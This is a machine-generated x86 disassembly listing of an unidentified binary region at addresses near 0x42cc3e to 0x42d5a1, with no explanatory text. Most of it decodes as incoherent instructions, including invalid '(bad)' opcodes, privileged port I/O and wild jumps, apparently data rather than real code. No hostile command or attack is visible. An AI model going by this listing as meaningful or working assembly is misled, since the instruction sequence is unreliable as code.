  42cc3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc3f:	mov    bh,0xa9
  42cc41:	sub    al,0x67
  42cc43:	mov    edx,?
  42cc45:	sbb    esi,DWORD PTR [edi-0xe]
  42cc48:	cmp    eax,0x8d1be882
  42cc4d:	cli    
  42cc4e:	gs sahf 
  42cc50:	sub    ecx,ebx
  42cc52:	pop    ds
  42cc53:	mov    al,ds:0x32db6f63
  42cc58:	ins    DWORD PTR es:[edi],dx
  42cc59:	xchg   esi,eax
  42cc5a:	and    BYTE PTR [edx+eax*2-0x6489065b],bl
  42cc61:	out    dx,eax
  42cc62:	pusha  
  42cc63:	fcomp  QWORD PTR [ecx+0x43a908d5]
  42cc69:	fbld   TBYTE PTR [ebx]
  42cc6b:	mov    ah,0xa6
  42cc6d:	sbb    BYTE PTR [ebp+0x19c58eb6],0x63
  42cc74:	icebp  
  42cc75:	inc    edi
  42cc76:	loope  0x42cca9
  42cc78:	scas   al,BYTE PTR es:[edi]
  42cc79:	stos   DWORD PTR es:[edi],eax
  42cc7a:	inc    bp
  42cc7c:	mov    dl,0xca
  42cc7e:	std    
  42cc7f:	and    al,0xc9
  42cc81:	cmp    BYTE PTR [esi],dh
  42cc83:	jl     0x42cc39
  42cc85:	imul   ecx,DWORD PTR [ecx-0x3de24f97],0xffffffb8
  42cc8c:	ja     0x42cc10
  42cc8e:	outs   dx,DWORD PTR ds:[esi]
  42cc8f:	mov    ds:0x4876ffd5,eax
  42cc94:	mov    al,ds:0x8ca85d35
  42cc99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc9a:	adc    eax,ecx
  42cc9c:	mov    esi,0x62216c47
  42cca1:	jg     0x42cc91
  42cca3:	push   eax
  42cca4:	imul   ebx,DWORD PTR [ebx],0xa56247d1
  42ccaa:	xor    BYTE PTR [edi],dl
  42ccac:	lods   eax,DWORD PTR ds:[esi]
  42ccad:	sbb    bl,bl
  42ccaf:	dec    edx
  42ccb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccb1:	sub    ax,0x81c
  42ccb5:	jle    0x42cca1
  42ccb7:	ins    DWORD PTR es:[edi],dx
  42ccb8:	add    ch,0xbe
  42ccbb:	sar    DWORD PTR [edi],0x4
  42ccbe:	dec    esp
  42ccbf:	mov    al,0x25
  42ccc1:	dec    ebp
  42ccc2:	xchg   esp,eax
  42ccc4:	pop    ebp
  42ccc5:	lds    esi,FWORD PTR [ecx]
  42ccc7:	lods   eax,DWORD PTR ds:[esi]
  42ccc8:	pop    edx
  42ccc9:	mov    ah,0xa
  42cccb:	sbb    bl,BYTE PTR [eax-0xa535bb1]
  42ccd1:	div    DWORD PTR [edx+0x59d044b7]
  42ccd7:	fcmove st,st(6)
  42ccd9:	dec    edi
  42ccda:	jmp    FWORD PTR [edi+0x38664258]
  42cce0:	push   0x9d795705
  42cce5:	or     DWORD PTR [edi+0x42a776de],ecx
  42cceb:	jo     0x42cd3a
  42cced:	pop    ebp
  42ccee:	mov    bl,0xbf
  42ccf0:	and    BYTE PTR [esi+0x19af856],cl
  42ccf6:	imul   esp,DWORD PTR gs:[edi],0xfffffffc
  42ccfa:	fsub   st,st(6)
  42ccfc:	retf   0xe464
  42ccff:	pop    ebx
  42cd00:	cli    
  42cd01:	and    eax,0x5ab5c166
  42cd06:	in     eax,0x82
  42cd08:	mov    edx,0xa52162cf
  42cd0d:	and    ah,BYTE PTR [ecx-0x3df1ec7]
  42cd13:	in     al,dx
  42cd14:	int3   
  42cd15:	cmc    
  42cd16:	pop    ss
  42cd17:	mov    bh,0x93
  42cd19:	mov    dl,0xb
  42cd1b:	xchg   ecx,eax
  42cd1c:	push   edx
  42cd1d:	jo     0x42cd6a
  42cd1f:	int    0xea
  42cd21:	pop    es
  42cd22:	and    DWORD PTR [ebp-0x1b],0x588eff60
  42cd29:	scas   al,BYTE PTR es:[edi]
  42cd2a:	add    bh,BYTE PTR ds:0x528e95cf
  42cd30:	fcmovnb st,st(1)
  42cd32:	or     cl,BYTE PTR [eax+0x47]
	...
  42cd94:	add    BYTE PTR [eax],al
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	mov    edx,0x33449d23
  42cda7:	loopne 0x42cdaa
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi+0xd81e04f],bl
  42cdb3:	lock ja 0x42cdba
  42cdb6:	xchg   edx,eax
  42cdb7:	dec    DWORD PTR [ebp-0x65e276d4]
  42cdbd:	gs pop ebx
  42cdbf:	xchg   edx,eax
  42cdc0:	push   edx
  42cdc1:	ja     0x42ce3d
  42cdc3:	push   ss
  42cdc4:	fisttp DWORD PTR [edx]
  42cdc6:	push   edi
  42cdc7:	jmp    0x7f2b:0xec968780
  42cdce:	push   edx
  42cdcf:	outs   dx,DWORD PTR ds:[esi]
  42cdd0:	or     edx,ebx
  42cdd2:	(bad)  
  42cdd3:	jle    0x42ce50
  42cdd5:	cmp    al,0x4f
  42cdd7:	jnp    0x42cd80
  42cdd9:	inc    ecx
  42cdda:	in     al,0x96
  42cddc:	out    0x5d,eax
  42cdde:	fimul  WORD PTR [eax+0x31b8b490]
  42cde4:	push   es
  42cde5:	in     al,0x2e
  42cde7:	adc    BYTE PTR [edx],bl
  42cde9:	jno    0x42cdb7
  42cdeb:	dec    edi
  42cdec:	cmp    al,0x75
  42cdee:	outs   dx,BYTE PTR ds:[esi]
  42cdef:	add    eax,0x56ead0e7
  42cdf4:	aam    0x6
  42cdf6:	push   eax
  42cdf7:	xchg   edx,eax
  42cdf8:	pop    esi
  42cdf9:	gs pop esi
  42cdfb:	dec    ecx
  42cdfc:	xor    al,0x61
  42cdfe:	xchg   edi,eax
  42cdff:	test   DWORD PTR [eax],edx
  42ce01:	pop    edi
  42ce02:	lahf   
  42ce03:	daa    
  42ce04:	xchg   esp,eax
  42ce05:	mov    BYTE PTR [esi-0x58c5771f],bh
  42ce0b:	(bad)  
  42ce0c:	aas    
  42ce0d:	mov    ah,0xa5
  42ce0f:	(bad)  
  42ce10:	adc    eax,DWORD PTR [esi-0x247bdd3e]
  42ce16:	mov    ds:0xdcc16a0,eax
  42ce1b:	mov    dl,0xb6
  42ce1d:	jmp    0xac8d1b25
  42ce22:	into   
  42ce23:	fimul  DWORD PTR [edx-0x6f3591b]
  42ce29:	enter  0x7f8,0x31
  42ce2d:	lods   al,BYTE PTR ds:[esi]
  42ce2e:	cmp    eax,0xd5b3a41d
  42ce33:	pop    eax
  42ce34:	adc    BYTE PTR [esp+edi*1],dl
  42ce37:	stos   BYTE PTR es:[edi],al
  42ce38:	xchg   DWORD PTR [ecx+0x8],edi
  42ce3b:	push   esp
  42ce3c:	pop    ds
  42ce3d:	les    ebp,FWORD PTR [esi-0x76]
  42ce40:	push   esp
  42ce41:	loopne 0x42cdd9
  42ce43:	das    
  42ce44:	dec    eax
  42ce45:	pop    es
  42ce46:	pusha  
  42ce47:	jnp    0x42ce0b
  42ce49:	pusha  
  42ce4a:	test   dh,0xa7
  42ce4d:	adc    dh,BYTE PTR [ecx-0x4cf3e3ce]
  42ce53:	sub    DWORD PTR [esi-0xd68836f],ecx
  42ce59:	xchg   ebx,ebx
  42ce5b:	clc    
  42ce5c:	inc    ebp
  42ce5d:	int    0x7d
  42ce5f:	mov    ebp,cs
  42ce61:	aad    0xba
  42ce63:	push   0xc428a6a1
  42ce68:	jge    0x42cebc
  42ce6a:	data16 mov ah,0xc7
  42ce6d:	pop    ecx
  42ce6e:	xchg   ebx,eax
  42ce6f:	clc    
  42ce70:	sub    al,0x24
  42ce72:	cdq    
  42ce73:	test   ecx,edi
  42ce75:	das    
  42ce76:	lods   eax,DWORD PTR ds:[esi]
  42ce77:	jne    0x42cec8
  42ce79:	adc    al,0x0
  42ce7b:	cmp    eax,0xb62aed92
  42ce80:	cdq    
  42ce81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce82:	and    DWORD PTR [eax-0x74],esp
  42ce85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce86:	std    
  42ce87:	stos   BYTE PTR es:[edi],al
  42ce88:	sub    ecx,DWORD PTR [ebp-0xf3a61d4]
  42ce8e:	scas   al,BYTE PTR es:[edi]
  42ce8f:	sbb    ah,ah
  42ce91:	dec    ebx
  42ce92:	icebp  
  42ce93:	dec    ebp
  42ce94:	push   0xffffffd4
  42ce96:	add    dh,BYTE PTR [eax]
  42ce98:	loopne 0x42ceda
  42ce9a:	sub    eax,0x20fef5df
  42ce9f:	sahf   
  42cea0:	jmp    0x5f353c01
  42cea5:	adc    DWORD PTR [esi+0x6b],ebp
  42cea8:	cli    
  42cea9:	leave  
  42ceaa:	pop    edx
  42ceab:	mov    gs,WORD PTR [eax]
  42cead:	(bad)  
  42ceae:	adc    DWORD PTR [ecx],ebp
  42ceb0:	or     al,0xbb
  42ceb2:	jb     0x42cecb
  42ceb4:	adc    BYTE PTR [eax],al
	...
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx+0x53482d11]
  42cf24:	scas   al,BYTE PTR es:[edi]
  42cf25:	inc    edx
  42cf26:	cmp    ah,cl
  42cf28:	add    DWORD PTR [eax],eax
  42cf2a:	pop    es
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    BYTE PTR [ecx],al
  42cf2f:	es (bad) 
  42cf31:	shr    ebp,cl
  42cf33:	in     al,0xcf
  42cf35:	inc    ebp
  42cf36:	and    al,0xf2
  42cf39:	loopne 0x42cfad
  42cf3b:	jnp    0x42cf50
  42cf3d:	leave  
  42cf3e:	test   BYTE PTR [ebp+0x13],ah
  42cf41:	mov    al,0xfc
  42cf43:	jo     0x42ced4
  42cf45:	xchg   ebx,eax
  42cf46:	or     DWORD PTR [ebx+0x561fd624],0xffffffab
  42cf4d:	cdq    
  42cf4e:	push   eax
  42cf4f:	xchg   ecx,eax
  42cf50:	ins    DWORD PTR es:[edi],dx
  42cf51:	jl     0x42cef3
  42cf53:	test   al,0x16
  42cf55:	bound  ebp,QWORD PTR [edx]
  42cf57:	icebp  
  42cf58:	int3   
  42cf59:	jl     0x42cf60
  42cf5b:	xchg   esi,eax
  42cf5c:	jnp    0x42cfb6
  42cf5e:	and    DWORD PTR [esp+edx*8],ebx
  42cf61:	xor    BYTE PTR [edi],dl
  42cf63:	ins    DWORD PTR es:[edi],dx
  42cf64:	ds jb  0x42cf29
  42cf67:	mov    bh,0x2a
  42cf69:	mov    ds:0x272550ca,eax
  42cf6e:	push   0xffffff86
  42cf70:	xor    eax,0x64c4bd74
  42cf75:	jno    0x42cf9a
  42cf77:	mov    WORD PTR ds:0xcc6c4637,fs
  42cf7d:	dec    esp
  42cf7e:	pop    eax
  42cf7f:	cli    
  42cf80:	mov    dl,0x6c
  42cf82:	out    0x79,al
  42cf84:	(bad)  
  42cf85:	jmp    0xbe13c20d
  42cf8a:	aas    
  42cf8b:	cld    
  42cf8c:	pop    esi
  42cf8d:	ins    DWORD PTR es:[edi],dx
  42cf8e:	not    DWORD PTR [ebx-0x53a80d42]
  42cf94:	jno    0x42cfea
  42cf96:	and    BYTE PTR [eax],al
  42cf98:	mov    DWORD PTR [eax-0x40f67cfd],0x842bbea7
  42cfa2:	ror    DWORD PTR [edi-0x735056a2],cl
  42cfa8:	adc    al,0xda
  42cfaa:	popf   
  42cfab:	and    esp,DWORD PTR [esi-0x5918e425]
  42cfb1:	stc    
  42cfb2:	hlt    
  42cfb3:	pop    eax
  42cfb4:	mov    al,0x5b
  42cfb6:	pop    ebx
  42cfb7:	(bad)  
  42cfb8:	pop    ss
  42cfb9:	inc    ebx
  42cfba:	test   DWORD PTR [esi],0x1b85b5f2
  42cfc0:	in     al,0x9c
  42cfc2:	into   
  42cfc3:	repnz loopne 0x42cf98
  42cfc6:	mov    ch,0x18
  42cfc8:	shl    edi,1
  42cfca:	scas   al,BYTE PTR es:[edi]
  42cfcb:	dec    esi
  42cfcc:	mov    ds:0xe6feca9e,al
  42cfd1:	or     ah,cl
  42cfd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfd4:	data16 (bad) [ebp*8-0x74a0eddf]
  42cfdc:	jnp    0x42cfbc
  42cfde:	mov    cl,BYTE PTR [esi]
  42cfe0:	dec    edi
  42cfe1:	loope  0x42cfad
  42cfe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfe4:	xchg   esp,eax
  42cfe5:	in     al,0x19
  42cfe7:	pop    ebp
  42cfe8:	xor    BYTE PTR [ebp+0x7bc67151],al
  42cfee:	xor    DWORD PTR [esi+eax*4],ebp
  42cff1:	ficomp WORD PTR [ebx-0x62]
  42cff4:	sahf   
  42cff5:	sbb    cl,dl
  42cff7:	sahf   
  42cff8:	icebp  
  42cff9:	push   ebx
  42cffa:	cmp    esi,eax
  42cffc:	imul   edx,DWORD PTR [ecx-0x1b],0xffffff98
  42d000:	fst    DWORD PTR [eax+0x44]
  42d003:	dec    ebp
  42d004:	or     al,0xe8
  42d006:	pusha  
  42d007:	(bad)
  42d00c:	in     al,dx
  42d00d:	stc    
  42d00e:	cmp    al,0xdb
  42d010:	iret   
  42d011:	fimul  DWORD PTR [eax+0x2a81f210]
  42d017:	repnz cli 
  42d019:	push   esi
  42d01a:	xchg   ecx,eax
  42d01b:	cmp    al,0x7b
  42d01d:	xchg   esi,eax
  42d01e:	pop    esp
  42d01f:	sbb    BYTE PTR [edi],ah
  42d021:	push   cs
  42d022:	test   eax,0xde8e6000
  42d027:	push   ss
  42d028:	cdq    
  42d029:	inc    esp
  42d02a:	out    dx,al
  42d02b:	fist   WORD PTR [esi-0x36]
  42d02e:	bound  ebp,QWORD PTR [ebp+0x43]
  42d031:	test   DWORD PTR [edx+0x2f],edx
  42d034:	jmp    0x0:0x0
	...
  42d093:	add    BYTE PTR [eax],al
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	mov    eax,0x41acc820
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [eax+0x43953f76],bl
  42d0b3:	lahf   
  42d0b4:	cmp    DWORD PTR [eax-0x3d932d42],0xee0e39de
  42d0be:	test   DWORD PTR [edi],0x81f54c8a
  42d0c4:	sub    esp,0x7c36ea21
  42d0ca:	addr16 add eax,0xe3d83fb5
  42d0d0:	xor    BYTE PTR [edx+0x7112d39],dh
  42d0d6:	mov    edi,0x2b5f4872
  42d0db:	or     edx,ecx
  42d0dd:	bound  ebx,QWORD PTR ds:[ebx+ebp*4]
  42d0e1:	aaa    
  42d0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0e3:	mov    al,ds:0xe466565
  42d0e9:	cwde   
  42d0ea:	icebp  
  42d0eb:	xor    BYTE PTR [ebx],bh
  42d0ed:	adc    eax,0xe3ff88b1
  42d0f2:	mov    esi,0x98ab4327
  42d0f7:	jbe    0x42d0f2
  42d0f9:	daa    
  42d0fa:	push   ebx
  42d0fb:	mov    bl,BYTE PTR [esi+0x7a]
  42d0fe:	sub    ah,bl
  42d100:	not    DWORD PTR [ebx+eax*8+0x5ae8a6ed]
  42d107:	inc    ebp
  42d108:	jmp    0x1c261e03
  42d10d:	mov    ebx,0xe15e009
  42d112:	fs push edx
  42d114:	faddp  st(7),st
  42d116:	xchg   bl,ch
  42d118:	jo     0x42d175
  42d11a:	inc    esp
  42d11b:	lea    edx,[esi+0x4218b53]
  42d121:	sub    dl,BYTE PTR [ecx+eiz*1]
  42d124:	outs   dx,DWORD PTR ds:[esi]
  42d125:	sbb    edx,esp
  42d127:	push   ecx
  42d128:	mov    bl,0x55
  42d12a:	fwait
  42d12b:	ret    
  42d12c:	(bad)  
  42d12e:	or     eax,0xea2126a7
  42d133:	inc    esi
  42d134:	(bad)  
  42d136:	fisttp DWORD PTR [edi+0x13e06349]
  42d13c:	outs   dx,BYTE PTR ds:[esi]
  42d13d:	sub    DWORD PTR ds:0x6e860e4,edi
  42d143:	jge    0x42d0f6
  42d145:	mov    dl,0xc9
  42d147:	xchg   edx,eax
  42d148:	(bad)  
  42d149:	dec    esi
  42d14a:	cdq    
  42d14b:	pop    eax
  42d14c:	icebp  
  42d14d:	out    0x98,eax
  42d14f:	rcl    BYTE PTR [ebx+0x78d064ce],cl
  42d155:	enter  0x5fbf,0x44
  42d159:	pop    edx
  42d15a:	popa   
  42d15b:	aas    
  42d15c:	hlt    
  42d15d:	or     DWORD PTR [ecx+0x51],edi
  42d160:	push   0xdf496b6a
  42d165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d166:	js     0x42d143
  42d168:	jno    0x42d14f
  42d16a:	dec    ecx
  42d16b:	fisttp QWORD PTR [ebx]
  42d16d:	in     al,dx
  42d16e:	shl    DWORD PTR [eax-0x2],0xfa
  42d172:	aam    0x8b
  42d174:	addr16 je 0x42d156
  42d177:	push   esp
  42d178:	in     eax,0x9e
  42d17a:	and    ecx,esp
  42d17c:	test   DWORD PTR [ebx-0x4a],esi
  42d17f:	xor    DWORD PTR [eax-0x2a],0xffffffc3
  42d183:	hlt    
  42d184:	je     0x42d12c
  42d186:	xchg   esi,eax
  42d187:	(bad)  
  42d188:	ja     0x42d10c
  42d18a:	mov    al,0xc2
  42d18c:	shr    DWORD PTR [ecx+0x2d3054b0],cl
  42d192:	lods   al,BYTE PTR ds:[esi]
  42d193:	pop    es
  42d194:	push   es
  42d195:	jle    0x42d144
  42d197:	add    BYTE PTR [ebp+0x2],bh
  42d19a:	push   0xffffffb5
  42d19c:	ja     0x42d1dc
  42d19e:	push   0xffffffcb
  42d1a0:	stos   DWORD PTR es:[edi],eax
  42d1a1:	pop    ecx
  42d1a2:	clc    
  42d1a3:	(bad)  
  42d1a4:	shr    BYTE PTR [ecx-0x7b],cl
  42d1a7:	sbb    DWORD PTR [ecx-0xa5ceb81],edx
  42d1ad:	aad    0x30
  42d1af:	adc    dl,BYTE PTR [esi+eiz*4-0x70]
  42d1b3:	rcr    BYTE PTR [esi+0x0],1
	...
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	std    
  42d223:	jno    0x42d26f
  42d225:	test   BYTE PTR [eax-0x1d],0x1
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [ecx],dh
  42d22f:	xor    ebp,ebx
  42d231:	and    DWORD PTR [esi+0x6f],edx
  42d234:	inc    ebx
  42d235:	ss xchg edx,eax
  42d237:	loop   0x42d1c6
  42d239:	(bad)  
  42d23b:	jns    0x42d1fc
  42d23d:	int3   
  42d23e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d23f:	xchg   ebx,eax
  42d240:	jle    0x42d1e2
  42d242:	mov    esp,0x76263cb2
  42d247:	sub    edi,DWORD PTR [ebp-0x41f57817]
  42d24d:	and    DWORD PTR [edx-0x5],esp
  42d250:	pop    edi
  42d251:	jmp    0x42d235
  42d253:	loop   0x42d27e
  42d255:	or     ebx,DWORD PTR [edx]
  42d257:	mov    al,0xa
  42d259:	jo     0x42d1f3
  42d25b:	stos   DWORD PTR es:[edi],eax
  42d25c:	xchg   BYTE PTR [ebx-0x21],dh
  42d25f:	and    eax,0x809bc539
  42d264:	jno    0x42d27e
  42d266:	stos   BYTE PTR es:[edi],al
  42d267:	rol    DWORD PTR [ecx],1
  42d269:	jns    0x42d2d0
  42d26b:	mov    ebx,0xec6dbd73
  42d270:	iret   
  42d271:	cmp    DWORD PTR [ecx+ebp*8-0x5ab69489],0x91ee4af6
  42d27c:	addr16 mov edx,0xe08b2cbe
  42d282:	add    eax,0xcf6d5e8b
  42d287:	fs inc ebp
  42d289:	sub    esi,DWORD PTR [ecx]
  42d28b:	es fwait
  42d28d:	jnp    0x42d2ee
  42d28f:	add    eax,0x7866bbb2
  42d294:	mov    esi,0x5f1bcc1d
  42d299:	push   ebx
  42d29a:	cmp    dl,ah
  42d29c:	add    eax,0x20f1723a
  42d2a1:	ret    
  42d2a2:	aam    0xdb
  42d2a4:	(bad)  
  42d2a5:	xlat   BYTE PTR ds:[ebx]
  42d2a6:	push   0xffffffa2
  42d2a8:	mov    bh,0x52
  42d2aa:	xor    BYTE PTR [edi+ecx*1+0x72],dh
  42d2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2af:	cli    
  42d2b0:	mov    edi,0xd2919ca6
  42d2b5:	xor    eax,0xe2969652
  42d2ba:	cld    
  42d2bb:	retf   0xba39
  42d2be:	xchg   esp,eax
  42d2bf:	div    BYTE PTR [ebx+0x794a1502]
  42d2c5:	addr16 addr16 dec ebx
  42d2c8:	mov    eax,0x4cad23c8
  42d2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2ce:	loope  0x42d270
  42d2d0:	or     eax,0x47e9e1ef
  42d2d5:	jbe    0x42d2c3
  42d2d7:	dec    esi
  42d2d8:	sub    cl,dh
  42d2da:	dec    ecx
  42d2db:	shl    BYTE PTR [esi],cl
  42d2dd:	stos   BYTE PTR es:[edi],al
  42d2de:	add    eax,0xbeef4ea6
  42d2e3:	or     ebp,DWORD PTR [ebp+0x6a4a2f40]
  42d2e9:	mov    ds,ebp
  42d2eb:	and    esp,esp
  42d2ed:	popa   
  42d2ee:	loop   0x42d28e
  42d2f0:	add    eax,esp
  42d2f2:	sbb    BYTE PTR [edi+ecx*2-0x24],0x54
  42d2f7:	sub    BYTE PTR ds:0xb98b2c31,dh
  42d2fd:	iret   
  42d2fe:	imul   ebx,DWORD PTR [ebx-0x5566ce85],0x4c
  42d305:	pop    DWORD PTR [eax+edi*2+0x12f149f2]
  42d30c:	xchg   DWORD PTR [edi-0x16f7c537],ebx
  42d312:	dec    edi
  42d313:	mov    ch,0xab
  42d315:	adc    DWORD PTR [edx],edx
  42d317:	mov    ah,0x65
  42d319:	mov    edx,DWORD PTR [ebx]
  42d31b:	and    al,0xfc
  42d31d:	shl    BYTE PTR [esi-0x3e],1
  42d320:	mov    ebx,0x982e469e
  42d325:	jmp    0x42d36e
  42d327:	hlt    
  42d328:	dec    esi
  42d329:	push   ss
  42d32a:	mov    cl,0x7c
  42d32c:	cmp    BYTE PTR [edx+eax*4+0x40],cl
  42d330:	stos   BYTE PTR es:[edi],al
  42d331:	dec    esp
  42d332:	jg     0x42d300
  42d334:	rol    DWORD PTR [eax],0x0
	...
  42d393:	add    BYTE PTR [eax],al
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8-0x654085a8],bl
  42d3a5:	daa    
  42d3a6:	dec    edi
  42d3a7:	in     al,0x1
  42d3a9:	add    BYTE PTR [edi],al
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    cl,bh
  42d3af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3b0:	push   eax
  42d3b1:	cmp    edi,eax
  42d3b3:	push   ecx
  42d3b4:	or     bl,ch
  42d3b6:	xor    BYTE PTR ds:[ebx],dh
  42d3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3ba:	pop    es
  42d3bb:	stos   BYTE PTR es:[edi],al
  42d3bc:	sub    BYTE PTR [edi],bh
  42d3be:	lods   eax,DWORD PTR ds:[esi]
  42d3bf:	shl    edx,1
  42d3c1:	xor    dh,BYTE PTR [edx+0x6e]
  42d3c4:	imul   BYTE PTR [edx]
  42d3c6:	(bad)  
  42d3c7:	jg     0x42d384
  42d3c9:	sub    eax,0x169b6299
  42d3ce:	aaa    
  42d3cf:	clc    
  42d3d0:	jnp    0x42d3f7
  42d3d2:	mov    eax,0x3bd0a2c
  42d3d7:	neg    BYTE PTR [eax+0x581cb543]
  42d3dd:	loop   0x42d373
  42d3df:	icebp  
  42d3e0:	cld    
  42d3e1:	pop    ebp
  42d3e2:	xchg   ecx,esp
  42d3e4:	mov    edi,0xa029f1cb
  42d3e9:	outs   dx,BYTE PTR ds:[esi]
  42d3ea:	cmp    eax,0x3d09054b
  42d3ef:	sbb    esp,DWORD PTR [ecx]
  42d3f1:	bound  ebx,QWORD PTR [edi+0x10]
  42d3f4:	xor    ebp,DWORD PTR [eax-0x41b18655]
  42d3fa:	xchg   BYTE PTR ds:0x6ccb6acf,ch
  42d400:	xlat   BYTE PTR ds:[ebx]
  42d401:	fst    DWORD PTR [ecx+0x4b9b460f]
  42d407:	test   dh,al
  42d409:	pop    esp
  42d40a:	xor    eax,0x44765a43
  42d40f:	std    
  42d410:	and    bh,ah
  42d412:	mov    dl,0x90
  42d414:	xchg   ebx,eax
  42d415:	pop    eax
  42d416:	pop    ebp
  42d417:	pop    edi
  42d418:	sahf   
  42d419:	push   esi
  42d41a:	out    0x42,al
  42d41c:	pop    ebp
  42d41d:	addr16 arpl bp,di
  42d420:	out    0x5b,eax
  42d422:	call   0x6c3f0545
  42d427:	in     eax,0x25
  42d429:	dec    edi
  42d42a:	jl     0x42d455
  42d42c:	lahf   
  42d42d:	arpl   WORD PTR [eax+eiz*8-0x1b],di
  42d431:	jl     0x42d47f
  42d433:	jo     0x42d40a
  42d435:	loopne 0x42d456
  42d437:	mov    dh,0xfa
  42d439:	xor    eax,0x8e375592
  42d43e:	scas   al,BYTE PTR es:[edi]
  42d43f:	mov    ah,0xd
  42d441:	std    
  42d442:	or     esi,DWORD PTR [edi]
  42d444:	add    ecx,DWORD PTR [eax]
  42d446:	test   al,0xf1
  42d448:	(bad)  
  42d449:	fisubr WORD PTR [esi+0x32994484]
  42d44f:	mov    WORD PTR [ecx],dx
  42d452:	jle    0x42d450
  42d454:	sub    dh,0x4e
  42d457:	iret   
  42d458:	or     cl,BYTE PTR [ecx-0x58]
  42d45b:	dec    edx
  42d45c:	sub    ch,BYTE PTR [edx+eax*1-0x36]
  42d460:	test   al,0x89
  42d462:	or     bl,BYTE PTR [ebp*2-0x5c5731bb]
  42d469:	pop    ds
  42d46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d46b:	bound  edi,QWORD PTR [ecx+0x59022989]
  42d471:	push   edi
  42d472:	push   0xc7054e0f
  42d477:	jnp    0x42d4dc
  42d479:	stc    
  42d47a:	clc    
  42d47b:	test   eax,0xf3650b12
  42d480:	mov    dl,0x2e
  42d482:	or     al,0xe
  42d484:	fldcw  WORD PTR gs:[ecx+0x74]
  42d488:	aad    0x44
  42d48a:	pop    eax
  42d48b:	pop    esp
  42d48c:	(bad)  
  42d48d:	pop    edx
  42d48e:	arpl   WORD PTR [ecx-0x33ce37d6],si
  42d494:	cld    
  42d495:	mov    bh,dl
  42d497:	mov    WORD PTR [ebx],es
  42d499:	adc    DWORD PTR [ecx],ebx
  42d49b:	add    BYTE PTR [ecx+0x62d00ccf],bl
  42d4a1:	loope  0x42d47c
  42d4a3:	retf   0xf604
  42d4a6:	aaa    
  42d4a7:	popf   
  42d4a8:	addr16 push 0x3145b456
  42d4ae:	sub    eax,0xcbe98fb8
  42d4b3:	push   cs
  42d4b4:	push   esi
	...
  42d515:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d51b:	ja     0x42d4f6
  42d51d:	inc    DWORD PTR [eax]
  42d51f:	add    edx,DWORD PTR [eax-0x6fa1130d]
  42d525:	pop    es
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    BYTE PTR [ecx+0x24],ch
  42d530:	(bad)  
  42d531:	fptan  
  42d533:	popf   
  42d534:	mov    BYTE PTR [edx+esi*2+0x33e9a91e],bh
  42d53b:	xchg   BYTE PTR [edi+0x51c47a3d],al
  42d541:	sub    al,0xd4
  42d543:	adc    eax,0x364b68e0
  42d548:	fstp   TBYTE PTR [ecx-0x759c33e0]
  42d54e:	add    ah,BYTE PTR [eax]
  42d550:	(bad)  
  42d551:	cmp    esi,DWORD PTR [edx+0x21a378fb]
  42d557:	adc    ebp,DWORD PTR [ebx]
  42d559:	fdiv   st,st(1)
  42d55b:	cmp    bl,BYTE PTR [edx-0x4a]
  42d55e:	inc    edx
  42d55f:	ja     0x42d4fd
  42d561:	or     ecx,DWORD PTR [ebx+ebx*4+0x1aabd06e]
  42d568:	mov    ds:0x52b3254f,eax
  42d56d:	in     al,0x4e
  42d56f:	hlt    
  42d570:	mov    eax,ds:0x37dd7526
  42d575:	dec    eax
  42d576:	arpl   WORD PTR [eax],di
  42d578:	pop    ss
  42d579:	cmp    eax,0x1d2278a7
  42d57e:	pop    ss
  42d57f:	enter  0x37ee,0x8d
  42d583:	in     eax,0xac
  42d585:	push   esp
  42d586:	and    BYTE PTR [ecx-0x206a2b31],bl
  42d58c:	cs jp  0x42d542
  42d58f:	or     DWORD PTR [edi-0x73],esp
  42d592:	out    0x76,eax
  42d594:	adc    DWORD PTR [esi+0xfe1846d],0x2c
  42d59b:	test   DWORD PTR [eax-0x767291bf],eax
  42d5a1:	add    DWORD PTR [edi+eax*8+0x781379da],edi
